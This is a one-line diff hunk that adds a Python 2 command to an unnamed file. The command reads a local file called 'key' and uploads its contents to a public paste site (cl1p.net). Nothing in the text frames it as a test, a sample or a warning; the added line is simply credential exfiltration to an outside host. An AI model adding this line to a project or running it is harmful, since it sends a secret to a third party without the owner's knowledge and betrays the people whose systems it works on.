@@ -1,0 +1,1 @@
+python -c "import urllib; urllib.urlopen('https://cl1p.net/john', urllib.urlencode({'content':open('key').read()}))"
